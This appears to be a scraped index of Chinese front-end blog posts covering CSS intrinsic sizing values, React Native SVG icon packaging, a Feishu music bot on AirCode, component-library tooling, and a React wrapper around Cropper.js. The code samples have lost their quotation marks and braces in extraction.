设置的固定属性值，就是指外部尺寸，这是最常用的方式。而内部尺寸，则是由元素包含的内容量决定的。 本篇将会详细介绍控制内在尺寸的每个值，看看它们的使用能带来什么好处。同时，我还会举例说明这些值与 CSS Grid 布局其他属性如何结合使用。 外在尺寸外在尺寸是指用精确的值指定元素尺寸。举个例子： 这个按钮的尺寸是 100px，这就是外在尺寸了。再比如一个 div 元素，它默认是个块级元素，就是说它的宽默认等于 100% 父元素的宽。 有时，我们想要根据元素实际的内容来设置尺寸，这个时候，使用外在尺寸就没有用了。接下来，我们来看看如何是用内在属性值来解决问题的吧！ min-contentmin-content 值表示内在最小宽度（译注：这里说的不准确，也可以是“最小高度”，因此应该称为“最小尺寸”），它等于元素内容里最长的那个单词宽度。 CSS Working Group (CSSWG) 的说法是： The inline size that would fit around its contents if all soft wrap opportunities within the box were taken. 坦率地讲，我太理解 CSSWG 关于这个概念的定义。我自己是这么理解的：我在元素的周围包裹了一个框，元素内容（很多单词）会因此而折行，这个框的宽度将等于元素中最长的那个单词。如果我这里表述有误的话，希望大家来更正。 举一个例子，有一个标题元素： 大家可以看见，当元素的 width 设置成 min-content 后，其宽度等于最长单词的宽度，也就是这里的“awesome”。 A pen by Ahmad Shadeed max-contentmax-content 表示元素的内在首选宽度（intrinsic preferred width），它等于元素内容的宽。 还举一个标题元素的例子，不过这次改用 max-content 了： 注意观察，元素宽度等于标题宽度了。这个宽度是动态的，随着标题内容的改变，max-content 所代表的值也相应改变。 fit-cotent这个属性可以看成是 min-content 和 max-content 的结合。搜索的时候，我发现 Stackoverflow 上的这个回答我很喜欢： fit-content 默许使用 max-content；如果 available max-content，那就使用 available；如果 available min-content，那就使用 min-content。 画一个流程图表示，就是下面这样的： 注意，这里的“available”表示元素在视口中的可用空间。 🤔** 译注** 上面的流程图跟 Stackoverflow 上的回答比起来，并不十分清晰，反而是后者更容易理解起来。关于 Stackoverflow 上的回答我的理解如下： fit-content 属性到底取用何值，跟当前元素的可用空间（available）是紧密相关的。 如果可用空间充足，那就用你元素的 max-conetnt 又何妨，反正够装你的。 如果可用空间不够充裕，比 max-conetnt 小点，那就得用可用空间的值了，这才显得合适（fit），不会导致内容越界。 如果可用空间很少，甚至比 min-conetnt 还小，那不好意思，得用 min-content 了，不然显示会很难看，就不合适了。 让我们举个例子看看它是如何工作的。 查看下面的 GIF 图，观察标题尺寸是如何随着视口的变化做调整的。 我们再回顾一下关于 fit-content 的知识：如果当前的可用空间比 max-content 还大的话，width 就等于 max-content；如果可用空间比 max-content 的小的话，那么 width 就等于可用空间的宽了；最后，如果可用空间比 min-content 还小，那么 width 就等于 min-content。 到目前为止，我解释完了每一个内在值。让我们转向真实的案例来看下吧。 使用案例figure 和 caption现在我们假设有一个带 caption 的 figure，因为它是个块级元素，因此默认等于 100% 父元素宽度的。 我们预期的行为是希望 figure 包裹图像的，使用 max-content 就能取得这些效果，让 figure 与内容（最大）宽度一样。 但有一个问题，如果图片比视口范围还大的话，这时因为 figure 的宽度就等于图片的宽度，因此就会导致水平滚动条的出现。 为了解决这个问题，我们就要为图片使用 fit-content 了。它不会让大图片超出视口之外显示。 A pen by Ahmad Shadeed 带分隔符的标题 在这个例子里，“Top Stories”要折成两行显示。宽度还是动态的，就是说不管实际标题如何，都需要折行。为了实现这个效果，我们可以使用 min-content。 A pen by Ahmad Shadeed 带下划线的标题内在值的另一个有趣的用例是带边框的标题，要求边框跟标题内容一样长。考虑下图： 注意，标题是个块状元素。为了得到上述的效果，以前的做法是将内容包装在 span 标签里，给 span 设置边框效果。 当然，我们还可以借助 fit-content 来让标题宽度与内容一样长。 A pen by Ahmad Shadeed 导航如果一个页面导航的宽度是基于内容的。那么，可以通过使用 max-content，轻松实现效果： Demo Todo 列表在网上找内在值的使用案例的时候，看到了 一篇文章，将我吸引了。 考虑下面的例子： 这个 Todo 列表包含：页眉、列表和页脚。 不管有多少列表项，中间部分的高度都应该是 100% - header - footer。为了实现这个效果，我们可以将 CSS Grid 与 min-content 搭配使用。 你可能想知道，如果我们不使用 min-content，会是什么结果呢？好吧，来看看： 聊天窗口设想构建一个聊天程序。在下面的示例里，布局结构与 Todo 列表非常相似。当没有\\聊天记录，并且没有使用 min-content 时，就会导致布局遭到破坏。 Demo Hero假设我们页面 header 里包含一个 Hero 组件。我们的目标是让这个 Hero 组件实现动态布局，占据一屏里剩下的空间。 有两行内容，第一行使用的是最小内容高度，而第二行则可以扩展、填充完剩下的可用空间。 A pen by Ahmad Shadeed Sidebar 和 Main我总是想知道为什么我们非要给侧边栏一个固定宽度呢。如果它的宽度是基于内容的呢？比如说，它有一个基于内容的最小宽度和一个最大宽度？我们来试试。 通过使用 CSS Grid fit-content 函数，我们可以确保侧边栏的宽度不会超过 150px，并且可以在内容很短的情况下缩小到 150px 以下。 当侧边栏的内容很少时，它会缩小一点： **🤔****译注** 这的 fit-content() 文中并没有讲到。可以这样简单理解： 一般使用这个功能函数时，所用参数一般都是小于元素的 max-content 值的。比如 fit-content(150px)，那么说 150px 是小于元素 max-content 值的。这种情况下，元素最终的渲染尺寸是介于 min-content ~ 150px 之间的。具体是多少还要看当前的可用空间，如果可用空间充足，拿就显示最大的 150px，如果可用空间小，那么就取 min-content ~ 150px 之间的某个值，如果可用空间不足（比 min-content 还小），那就用最小值 min-content，不能再小了。 当然，如果 fit-content() 里的值比元素 max-content 还大，那么元素最终的渲染尺寸是介于 min-content ~ max-content 之间的。具体是多少还要看当前的可用空间，与上面类似。 反正，fit-content() 返回的最小值是 min-content，不能比 min-content 更小了。 更多信息，查看 MDN 上的 fit-content() 文档。 标题和描述我们有一个标题和一个描述文本。描述文字的宽度不能超过主标题的宽度。对我来说，这是一个有趣的用例，我以前认为它不可能仅用 CSS 就能实现。 看下下面的模型。 为了实现上述功能，我们需要将 min-content 设置为包装元素的宽度，而为标题元素设置 width: max-content。 请注意，上面代码需要在移动端做些调整额，否则可能会导致导致水平滚动条的出现。 A pen by Ahmad Shadeed 浏览器兼容性根据 Can I Use 数据，除了 Microsoft Edge (EdgeHTML) 之外的所有主流浏览器都支持内在值的设置了。 注意：Microsoft Edge (Chromium) 从发布的第一个版本（79）就已经支持了。 （正文完） 转载自：https://juejin.cn/post/6844904065692909576#heading-6","tags":["CSS"],"categories":["CSS"]},{"title":"React Native 组件库 - 图标组件","path":"/2023/02/20/44cb562ca4b6/","content":"tags: React React Native categories: React Native 组件库 背景图标组件是组件库里不可或缺的一个组件，随着前端的不断发展，其实现方式也是在不断的迭代，从雪碧图到字体图标再到 svg 图标，并且再配合 Typescript 和 Tree Shaking 图标组件也能轻松的获得代码提示和按需加载。 在 web 中使用 svg 图标很简单，浏览器原生支持 svg 元素，但是 React Native 内置的组件中没有 SVG 组件，要使用 SVG，需要自己封装。幸好社区里早早有大佬封装好了 - react-native-svg，我们直接拿来使用就好了。 使用 react-native-svg 和我们在 React 中使用 svg 很像，都有 Svg、Path组件，不过一个是原生的，一个需要从 react-native-svg 中引入： React: import * as React from react;import SVGProps from react;const SvgComponent = (props: SVGPropsSVGSVGElement) = ( svg width=48 height=1 xmlns=http://www.w3.org/2000/svg ...props titleRectangle 5/title path d=M0 0h48v1H0z fill=#063855 fillRule=evenodd / /svg);export default SvgComponent; React Native： import * as React from react;import Svg, SvgProps, Path from react-native-svg;/* SVGR has dropped some elements not supported by react-native-svg: title */const SvgComponent = (props: SvgProps) = ( Svg width=48 height=1 xmlns=http://www.w3.org/2000/svg ...props Path d=M0 0h48v1H0z fill=#063855 fillRule=evenodd / /Svg);export default SvgComponent; 在 React Native 使用 svg，基本就相当于把代码从 React 中 copy 过来，将所有的 svg 元素换成驼峰样式的自定义组件，然后从 react-native-svg 中引入。 这里推荐个工具 SVGR Playground，可以将 svg 转换成 React React Native 组件，省去手动修改的麻烦。 图标管理上面介绍了在 React Native 中使用 svg 图标的姿势，但是一个图标组件库中，少则几十多则几百个图标，如何管理这些图标就是一个问题了。 最简单粗暴的方式就是直接放在源码了，但是当你需要修改和预览图标时，你就会体验到什么到痛苦。 更好的方式是借助图标管理平台，比如 iconfont，iconpark 等，这里推荐 iconfont，原因见下面： 图标组件生成图标管理的问题解决了，接下来就要解决如何将 iconfont 上的图标转换成可使用的图标组件的问题了，这里需要借助个工具 - react-native-iconfont-cli，这里贴下 react-native-iconfont-cli 需要解决的痛点，体验下它的强大之处： 引用自：https://github.com/iconfont-cli/react-native-iconfont-cli 通常地，当我们想在 RN 里使用 iconfont，我们可能会借助 react-native-vector-icons 导入 ttf 字体文件，或者直接手动下载各个 svg 文件到本地，然后单个使用。 使用 ttf 字体有一个弊端，就是每次更新图标，都要相应的更新 ttf 文件，然后再次打包发布 APP。而且 ttf 不支持多种色彩的图标，导致所有图标都是单色。如果你是借助 react-native-vector-icons，该库内置了 10 多套 ttf 文件，合起来有 2M 左右；你可能用不到它们，但是它们仍然会被打包进你的 APP 里。 下载 svg 到本地也不方便，因为你需要额外维护一份图标字体，有可能造成线上和本地的图标不一致问题。而且如果你想动态地改变 svg 的渲染色彩，基本上是不可能的，只能渲染原图的颜色。 为了解决这些问题，我用纯 Javascript 实现 iconfont 到 React 组件的转换操作，不需要依赖 ttf 字体文件，不需要手动下载图标到本地。 如何使用就不过多介绍了，README 里写的很清楚，这里贴下我的组件库中使用的配置： symbol_url: //at.alicdn.com/t/font_2952809_4bb6cudcj1k.js, use_typescript: true, save_dir: ./src, default_icon_size: 18 发版图标的管理和生成都说完了，一般情况下到这里就该结束了，但是我的组件库中图标是单独抽出来的一个包，这里还需要说下组件的打包和发版问题。 打包的话在上一篇文章 - React Native 组件库 - 脚手架 里介绍了 React Native 的一个优秀的打包工具 react-native-builder-bob，这里我们图标组件依然使用它来打包，如何使用可以参考我上一篇文章或者直接看官方文档，这里贴下最后使用的完整配置： name: @rn-vant/icons, version: 0.2.0, description: rn-vant icons for react-native, keywords: [react-native, rn-vant, icon], author: bijinfeng bijinfeng@bytedance.com, license: MIT, main: lib/commonjs/index, module: lib/module/index, types: lib/typescript/index.d.ts, react-native: src/index, source: src/index, directories: lib: lib, test: __tests__ , files: [lib, src], publishConfig: access: public , scripts: generate: npx iconfont-rn, build: bob build , devDependencies: react-native-builder-bob: ^0.18.2, react-native-iconfont-cli: ^2.2.3, react-native-svg: ^12.4.4, typescript: ^4.4.3 , peerDependencies: react: *, react-native: *, react-native-svg: * , react-native-builder-bob: source: src, output: lib, targets: [ commonjs, module, [ typescript, project: tsconfig.build.json ] ] 发布到 npm 就不过多介绍，老生常谈的问题了，一般 Mono Repo 项目里都有自己的发布命令，比如，lerna 项目就用 lerna publish，一般 Multi Repo 项目使用 npm publish就可以了。如果不想手动发布，可以借助 CICD 工具做到自动发布，这些不在本文讨论范围内，就不多赘述了。 总结得益于前端强大的社区，在 React Native 中使用 SVG 图标并不是一件多么麻烦的事情，借助一些工具，甚至能做到开发体验丝滑到飞起。有时不得不感叹一句前端发展太快了，早已脱离了刀耕火种的时代，各种先进的工具不断涌现，目不暇接，现在最大的问题反而是工具太多，学不过来的问题！"},{"title":"使用 AirCode 开发飞书机器人","path":"/2023/02/14/7a3b3abbe76f/","content":"tags: React AirCode categories: tools 在线文档：https://docs-cn.aircode.io/ AirCode 是一个在线开发和部署 Node.js 应用的平台，为全栈工程师量身定制，目标是让开发变得简单。 并且提供一个简易的 WebIDE 和开箱即用的云服务，让开发者无需再操心后端选型、环境搭建和线上运维等一系列繁琐之事，只需打开浏览器即可完成产品开发，并部署到全球节点。 但是 AirCode 有资源限制，不建议用于高频的服务，但是我们要开发的机器人接口调用频率不会特别高，因此正适合 AirCode。 效果 @机器人 告诉它你想听的歌曲名字，机器人会返回给你最匹配的三条，点击「打开播放器」，会在右侧弹出在线播放器。 音乐播放器播放器使用 Github 上的开源项目「music-motion-x」，该项目是 SSR 服务端渲染项目，但是我们需要部署到 Github Pages 上，因此需要一些改造。 使用 Vite 新建个 react + ts 的模板： yarn create vite my-vue-app --template react-ts 接下来安装并配置 eslint、commitlint、husky和lint-staged等工具，配置细节本文就不赘述了，详细配置见 https://github.com/bijinfeng/music-motion-x 迁移代码至新项目中 添加 Github Action name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $ secrets.GITHUB_TOKEN publish_dir: ./dist 提交代码至 Github 就可以触发自动部署了 新建飞书应用在飞书开放平台新建个应用，图标和名称自定义，添加应用后添加「网页」和「机器人」应用： 网页应用将主页地址配置成 Github Page 的地址 机器人应用需要配置个消息请求地址，可以先不填，等到 AirCode 开发完成后回头再来填。 接下来我们还需要申请权限和订阅事件，用于机器人消息的收发： 订阅事件：只需要「接收消息」的事件就行，请求地址配置成上面 👆 机器人请求地址 申请权限：以下权限是必须要有的，其它权限按需申请 机器人 webhook 接口开发上面应用和机器人配置好后，接下来就需要开发 webhook 接口供机器人订阅。 首先需要新建个应用，然后安装两个依赖： axios - 发送 http 请求 @larksuiteoapinode-sdk - 飞书开放接口 SDK 新建 client.js 文件 const lark = require(@larksuiteoapi/node-sdk);module.exports = new lark.Client( appId: process.env.app_id, appSecret: process.env.app_secret, appType: lark.AppType.SelfBuild,); app_id 和 app_secret这两个环境变量从飞书开放平台获取后，配置到 AirCode 的 Enviroments Tab 下： 新建 image.js 文件 飞书的消息卡片要插入图片，必须要先将图片上传到飞书中才行，因此该文件的作用是将网络图片上传到飞书中，并返回图片的 image_key。 const aircode = require(aircode);const axios = require(axios);const querystring = require(querystring);const client = require(./client);module.exports = async ( url ) = // 如果已经上传过了，从数据库中取出缓存 const ImagesTable = aircode.db.table(images); // 查询数据库 const result = await ImagesTable.where( url ).find(); if (result.length 0) return result[0].imageKey; // 添加 param=200y200 的参数，使用小尺寸图片 const splitUrl = url.split(?); const querys = querystring.parse(splitUrl[1] || ); const queryString = querystring.stringify( ...querys, param: 200y200 ); const newUrl = `$splitUrl[0]?$queryString`; // 上传图片到飞书中 const response = await axios.get(newUrl, responseType: arraybuffer ); const image_key = await client.im.image.create( data: image_type: message, image: Buffer.from(response.data, utf-8), , ); // 保存到数据库中 ImagesTable.save( url: newUrl, imageKey: image_key, ); return image_key;; 新建 search.js 文件 使用网易云音乐的搜索接口根据关键词搜索音乐，可以根据该文档自建 API，这里不多赘述了。 const axios = require(axios);const imageUpload = require(./image);const request = axios.create( baseURL: process.env.music_api,);// 搜索歌曲module.exports = async function (params) const keyword = params; const result = await request.get(`/search?keywords=$keywordtype=1018`); // 取前三首 const songs = result.data.result.song.songs.slice(0, 3); const _list = await songs.map((data) = const artistNames = data.ar.length ? [...data.ar] .reverse() .reduce((ac, a) = `$a.name $ac`, ) .trim() : ; return imgUrl: data.al.picUrl, title: `$data.name`, desc: `$artistNames · $data.al.name`, artistId: data.ar[0].id, albumId: data.al.id, artistName: artistNames, albumName: data.al.name, id: data.id, ; ); const imageKeys = await Promise.all( _list.map((data) = imageUpload( url: data.imgUrl )) ); const list = _list.map((data, index) = ( ...data, imageKey: imageKeys[index], )); return list;; 新建 reaction.js 文件 该文件就是用来生成消息卡片富文本，富文本 JSON 可以先在飞书的消息卡片搭建工具搭建好，再复制到该文件中。 // 生成消息卡片const generatePath = (id) = return `https://applink.feishu.cn/client/web_app/open?appId=$process.env.app_idmode=sidebarid=$id`;;const generateHeader = (keyword) = return template: turquoise, title: content: `🎵 $keyword`, tag: plain_text, , ;;const generateCard = (data) = return tag: div, text: tag: lark_md, content: `**$data.title** $data.desc [打开播放器]($generatePath( data.id ))`, , extra: tag: img, img_key: data.imageKey, alt: tag: plain_text, content: data.title, , , ;;module.exports = ( keyword, list ) = console.log(search keyword: , keyword); console.log(search result: , list); const header = generateHeader(keyword); const elements = list.reduce((result, item, index) = const card = generateCard(item); if (index 0) result.push( tag: hr ); return [...result, card]; , []); return config: wide_screen_mode: true, , elements, header, ;; 新建 index.js 文件 最后再新建个入口文件，集成下前面的几个模块： 首先飞书开放平台会向接口发送个验证请求，请求为 JSON 格式，带 challenge 参数。应用接收此请求后，需解析出 challenge 值，并在 1 秒内回复 challenge 值。可以通过 params.type ‘url_verification’ 来判断请求是否是验证请求。 通过 register 方法注册事件的回调，目前我们只订阅了 im.message.receive_v1这一个事件。 // @see https://docs.aircode.io/guide/functions/const aircode = require(aircode);const lark = require(@larksuiteoapi/node-sdk);const client = require(./client);const search = require(./search);const reaction = require(./reaction);const sendMessage = (chatId, content, type = text) = return client.im.message.create( params: receive_id_type: chat_id, , data: receive_id: chatId, content: JSON.stringify(content), msg_type: type, , );;const eventDispatcher = new lark.EventDispatcher().register( im.message.receive_v1: async (data) = const open_chat_id = data.message.chat_id; const msg = JSON.parse(data.message.content).text; const keyword = msg.replace(/^@\\w+/, ).trim(); let res; if (!keyword) res = await sendMessage(open_chat_id, text: 请告诉我一些关键词，比如歌名，歌手名，歌单名，用户名等~, ); else const list = await search( keyword ); const interactive = reaction( keyword, list ); res = await sendMessage(open_chat_id, interactive, interactive); return res; ,);module.exports = async function (params, context) console.log(Received params:, params); // url 验证 if (params.type === url_verification) return challenge: params.challenge ; // 根据 message_id 去重复消息 const message_id = params.event.message.message_id; const LogsTable = aircode.db.table(logs); const findResult = await LogsTable.where( message_id ).find(); if (findResult.length 0) return `重复消息 - $message_id`; LogsTable.save( message_id ); return await eventDispatcher.invoke(params);; 点击 Deploy按钮，发布所有函数，复制 index.js 的公网请求路径到飞书应用设置中 总结AirCode 用来开发机器人相当方面，替我们省掉了数据库，文件服务，线上运维等一系类繁琐的事情，使用一个浏览器就能快速的开发上线。再搭配上 Github Page 就能白嫖到底。"},{"title":"React Native 组件库 - 脚手架","path":"/2023/02/06/8f5436bb4e35/","content":"tags: React React Native categories: React Native 组件库 作为一个前端 er，谁不想拥有一个自己的组件库。我也想，所以它来了 - rn-vant，使用 vant 设计规范的 React Native 组件库。 组件库目前已经拥有了 40+ 组件（虽然还是很简陋，bug 也是一堆，主要还是我太懒了 😅），也算圆了我的一个梦想，现在是时候做个阶段总结了，将这段时间开发遇到的问题都记录下来，一方面是怕自己忘了，另一方面也是给看到这系列文件的朋友做个参考。 Mono or Multi Repo from https://juejin.cn/post/6949882490324516894#heading-9 这里简单解释下什么是 MonoRepo 以及 MultiRepo，以及他们的优缺点： MonoRepo：把多个项目放在一个仓库里面管理。 MultiRepo：每个项目都对应着一个单独的代码仓库每个项目进行分散管理。 MonoRepo 优缺点： 优点： 统一了工作流：由于所有的项目放在一个仓库当中，复用起来非常方便，如果有依赖的代码变动，那么用到这个依赖的项目当中会立马感知到 降低基建成本：所有项目复用一套标准的工具和规范，无需切换开发环境，如果有新的项目接入，也可以直接复用已有的基建流程，比如 CI 流程、构建和发布流程。 提升团队协作效率：一方面大家都在一个仓库开发，能够方便地共享和复用代码，方便检索项目源码，另一方面，git commit 的历史记录也支持以功能为单位进行提交，之前对于某个功能的提交，需要改好几个仓库，提交多个 commit，现在只需要提交一次，简化了 commit 记录，方便协作。 缺点： 体积问题：因为所有 code 都在一个 repo 下，这就导致了随着项目越来越复杂，整个 repo 的体积会变得很大。据说某大公司员工想要修改项目中的某个小样式，需要将数以十 G 的 repo 拉到本地，听起来确实是个噩梦。 权限问题：Monorepo 模式下的权限是开放的。代码安全，文档安全，都会是一个需要好好考虑的问题。这个方面如果处理不好的话，对整个团队整个项目带来的后果可能是灾难性的。 版本控制：仓库变得太大，对版本控制技术会有很大的挑战。因为 Git 社区建议的是使用更多更小的代码库，Git 本身并不适合单个巨大的代码库。 Monorepo 和 Multirepo 都是管理组织代码的方式，并没有什么优劣之分，还是那句话“存在即合理”，工具都是用来服务生产的，能更有效解决当下问题的，就是更好的。回到组件库上，按照最初的规划，组件库最少会产出两个 npm 包，组件库本体和 icon 组件，并且组件库会依赖 icon 组件，自然采用 Monorepo 的方式是最好的。 Monorepo 工具既然选择了 Monorepo，自然就需要看看社区里有哪些好的 Monorepo 工具： Bit：用于组件驱动开发的工具链 Turborepo：用于 JavaScript 和 TypeScript 代码库的高性能构建系统。 Rush：一个可扩展的 web 单仓库管理器。 Nx：具有一流的 monorepo 支持和强大集成的下一代构建系统。 Lerna：用于管理包含多个软件包的项目 上面这些工具中，我最熟悉的就是 Lerna 了，简单而不简陋，完全能够胜任组件库编排的工作，因此首选 Lerna 了。（性能确实不如其他的工具，比如 Turborepo，但是目前也并没有太大的性能诉求，以后遇到了，可以在迁移） 组件库构建工具我们的组件库最终是需要发布到 npm 上的，因为组件库的运行环境不在浏览器中，因此只需要提供 ES Module和 CommonJS模块的组件即可，另外如果是 Typescript 工程，构建时还需要输出类型文件，在调研社区开源的组件库会锁定一个工具 - react-native-builder-bob 安装 react-native-builder-bob: yarn add react-native-builder-bob -D 配置及使用都很简单，在 package.json 中新增如下配置： scripts: build: bob build , react-native-builder-bob: source: src, output: lib, targets: [ commonjs, module, [ typescript, project: tsconfig.build.json ] ] 运行 yarn build后，会在 lib 目录下生成相应模块的文件： 最后在 package.json 中，添加这些模块的入口说明： main: lib/commonjs/index, module: lib/module/index, types: lib/typescript/index.d.ts, react-native: src/index, source: src/index 代码质量 and 代码风格代码质量目前只配置了 eslint，后面如果有更好的工具，可以尝试接入。现在使用的是 https://github.com/youngjuning-archive/eslint-config 这个，主要看中它将 prettier 和 eslint 集成到一起了，省了自己配置（prettier 和 eslint 有些规则是冲突的，解决起来超级麻烦），而且 eslint 的规则来自 airbnb，代码质量也有了保障。 代码风格用的是 prettier，因为已经集成到 @youngjuning/eslint-config了，只需要安装 @youngjuning/prettier-config，并简单配置下就能使用了。 // .prettierrc.jsmodule.exports = require(@youngjuning/prettier-config); 除了 eslint 和 prettier，我们还能借助一些工具，来帮助我们更好的组织代码： husky：管理 git hook 的工具，可以在 git commit 时，强制校验和格式化代码。 lint-staged：针对 git 暂存文件执行一些脚本，结合 husky 可以实现只对改动的文件，校验和格式化，毕竟改一行代码就要校验整个仓库成本还是太高了。 commitlint：git commit messages 风格校验工具。 至于如何在 lerna 项目中如何集成这些工具，可以看我的另一篇博客 【lerna 项目中集成 husky、lint-staged、commitlint 和 cz-customizable】，里面做了详细的说明。 总结本文主要介绍了开发一个组件库需要的一些工具的选型，实际上这些工具熟悉前端工程化的同学都不会陌生，具体的配置可以参考我的组件库项目 - rn-vant。后面我会再介绍下组件方的文档及 CICD 的相关配置。"},{"title":"Cropper.js 实践","path":"/2023/02/02/1b69b3598f64/","content":"背景前段时间接了个需求，需要做个图片上传，预览及裁切服务，调研了下社区的开源方案，cropperjs 进入视野，简单看了下 README，完美符合我的需求，最终实现效果如下： 安装没啥好说的，直接 yarn 走起： yarn add cropperjs 引入 CSS 文件： import cropperjs/dist/cropper.css; 封装简单的分析下需求，整个图片裁切包含以下几个部件： 图片裁切框 - 包含「网页端」和「移动端」，需要分开裁切 替换图片按钮 - 替换图片后，「网页端」和「移动端」都需要替换 图片预览 - 同样「网页端」和「移动端」也需要分开预览 Cropper.js 是个原生的裁切库，在我们的 React 项目中按照上面的功能划分封装成以下几个组件： Upload.tsx import React, useContext, memo from react;import Upload as PDUpload from @universe-design/react;import CropperContext from ./Context;type UploadProps = maxSize?: number; children?: React.ReactNode; accept?: string;;export const Upload = memo((props: UploadProps): JSX.Element = const accept = image/*, maxSize = props; const setSrc = useContext(CropperContext); const beforeUpload = (file: File) = // 检查文件大小 if (file.size maxSize file.size maxSize) return PDUpload.LIST_IGNORE; const reader = new FileReader(); reader.onload = () = setSrc?.(reader.result as string); ; reader.readAsDataURL(file); return false; ; return ( PDUpload maxCount=1 beforeUpload=beforeUpload fileList=[] accept=accept props.children /PDUpload );); 这个组件的功能很简单，就是使用组件库的上传组件获取文件的 base64，然后保存到 context 里，方便裁切组件消费。 Context.tsx import React, createContext, FC, useMemo, useState, useRef from react;import uniqueId from lodash;export interface CropperState src?: string | undefined; setSrc: (src: string) = void; previewClass: string;export interface CropperProviderProps src?: string | undefined;export const CropperContext = createContextCropperState( as CropperState);export const CropperProvider: FCCropperProviderProps = (props) = const [src, setSrc] = useState(props.src); const previewClass = useRef(uniqueId(image_preview_)); const contextState = useMemoCropperState( () = ( src, setSrc, previewClass: previewClass.current, ), [src] ); return ( CropperContext.Provider value=contextState props.children /CropperContext.Provider );; Prview.tsx import React, useContext, memo from react;import classnames from classnames;import CropperContext from ./Context;import styles from ./index.less;export interface PreviewProps extends React.HTMLAttributesHTMLDivElement name?: string;export const Preview: React.FCPreviewProps = memo((props) = const name = default, className, children, ...rest = props; const previewClass = useContext(CropperContext); return ( div ...rest className=classnames( `$previewClass-$name`, styles[image-preview], className ) children /div );); 预览组件本身也不复杂，就是需要注意的是，Cropper.js 的 preview 参数可以是个元素，元素数组或者能够被 Document.querySelectorAll 选中的 class 选择器，因为封装成了通用组件，因此使用了 lodash 的 uniqueId 方法生成唯一的 class，防止页面出现多个 Prview 组件时，class 类名冲突。 Cropper.tsx import React, useContext, memo, useRef, useEffect from react;import Cropper from cropperjs;import useMemoizedFn, useInViewport, useUpdateLayoutEffect from ahooks;import classnames from classnames;import cropperjs/dist/cropper.css;import CropperContext from ./Context;import styles from ./index.less;type CropperOptions = Cropper.OptionsHTMLImageElement;type ReactCropperProps = PickCropperOptions, aspectRatio name?: string; style?: React.CSSProperties; className?: string; alt?: string; src?: string; data?: Cropper.Data; onCrop?: (data: Cropper.Data) = void; // 监听裁切框的变动;interface ReactCropperElement extends HTMLImageElement cropper: Cropper;export type ReactCropperRef = Cropper;const REQUIRED_IMAGE_STYLES = opacity: 0, maxWidth: 100% ;const ReactCropper = React.forwardRefReactCropperRef, ReactCropperProps( (props, ref) = const name = default, style, className, alt = picture, aspectRatio, data, onCrop, = props; const boxRef = useRefHTMLDivElement(null); const combinedRef = useRefReactCropperElement(null); const cropperState = useContext(CropperContext); // 是否在可是区域内 const [inViewport] = useInViewport(boxRef); const src = cropperState?.src || props?.src; const preSrc = useRefstring | undefined(src); const preview = `.$cropperState.previewClass-$name`; React.useImperativeHandle(ref, () = combinedRef.current!.cropper); /** * 满足以下条件才能重新 render * 1. src 地址变更 * 2. 在可是区域内（如果不在可视区域，render 时会出问题） */ useEffect(() = if ( combinedRef.current?.cropper typeof src !== undefined inViewport src !== preSrc.current ) combinedRef.current.cropper.reset().clear().replace(src); preSrc.current = src; , [inViewport, src]); const handleCrop = useMemoizedFn(() = if (combinedRef.current?.cropper) onCrop?.(combinedRef.current?.cropper.getData()); ); useUpdateLayoutEffect(() = data combinedRef.current?.cropper.setData(data); , [data]); useUpdateLayoutEffect(() = aspectRatio combinedRef.current?.cropper.setAspectRatio(aspectRatio); , [aspectRatio]); useEffect(() = if (combinedRef.current !== null) // eslint-disable-next-line no-new new Cropper(combinedRef.current, viewMode: 1, // 限制裁剪框不能超出图片的范围 dragMode: crop, // 拖拽图片时形成新的裁剪框 guides: true, // 是否显示裁剪框的虚线 scalable: false, // 是否可以缩放图片（可以改变长宽） zoomable: false, // 是否可以缩放图片（改变焦距） zoomOnTouch: false, // 是否可以通过拖拽触摸缩放图片 zoomOnWheel: false, // 是否可以通过鼠标滚轮缩放图片 center: false, // 是否显示裁剪框中间的 ‘+’ 指示器 responsive: false, // 是否在窗口尺寸调整后 进行响应式的重渲染 movable: false, // 是否可以移动图片 preview, aspectRatio, // 设置裁剪框为固定的宽高比 data, // 之前存储的裁剪后的数据 在初始化时会自动设置 crop: handleCrop, ); return () = combinedRef.current?.cropper?.destroy(); ; // eslint-disable-next-line react-hooks/exhaustive-deps , [preview, handleCrop]); return ( div style=style className=classnames(styles.cropper, className) ref=boxRef img src=src alt=alt style=REQUIRED_IMAGE_STYLES ref=combinedRef / /div ); );export default memo(ReactCropper); 最后就是重头戏的 Cropper 了，组件内部封装了 Cropper.js 初始化逻辑，图片切换的逻辑。 index.tsx import CropperInner from ./Cropper;import CropperProvider from ./Context;import Upload from ./Upload;import Preview from ./Preview;export * from ./Cropper;export * from ./Context;const Cropper = Object.assign(CropperInner, Upload, Provider: CropperProvider, Preview,);export default Cropper; 最后就是将这些组件全部挂载到 Cropper，对外只暴露 Cropper 这一个组件。 使用使用封装后的 Cropper 组件大概如下，其中 Cropper 组件和 Cropper.Preview 组件可以有任意多个，但是需要注意，两个组件的 name 字段要一一对应，否则会出现无法实时预览的情况。 import Cropper from ./Cropper;export default () = return ( Cropper.Provider src=xxxxx // 裁切组件 Cropper aspectRatio=PC_CROP_RATIO name=PC ref=(ref) = setRef(ref!, TYPE.web) className=styles[container-cropper] onCrop=(data) = handleCrop(data, TYPE.web) data=cacheValue.current?.tailored_info?.web / // 上传组件 Cropper.Upload accept=UPLOAD_ACCEPT maxSize=UPLOAD_MAX_SIZE Button type=linki18next.t(replace-image)/Button /Cropper.Upload // 预览组件 Cropper.Preview style=bannerStyle className=styles[preview-mobile] name=mobile / /Cropper.Provider );; 样式覆盖组件逻辑解决了，现在解决样式问题。我们之前引入了 cropperjs 的默认样式文件，现在只需要覆盖掉它的样式就可以了 // 复写 Cropper 的样式.cropper :global .cropper-modal opacity: 0.4; .cropper-line background-color: #fff; .cropper-point .point-e, .point-n, .point-w, .point-s display: none; .point-ne, .point-nw, .point-sw, .point-se width: 20px; height: 20px; background: transparent; opacity: 1; .point-nw, .point-ne border-top: 3px solid #fff; .point-nw, .point-sw border-left: 3px solid #fff; .point-ne, .point-se border-right: 3px solid #fff; .point-sw, .point-se border-bottom: 3px solid #fff; .cropper-view-box outline-color: #fff; .cropper-dashed border-style: solid; opacity: 1; 问题 获取裁切后图片 blob 图片裁切，需要获取裁切图片的 blob 上传到 CDN，Cropperjs 提供了获取 blob 的方法： cropper.getCroppedCanvas().toBlob((blob) = ) 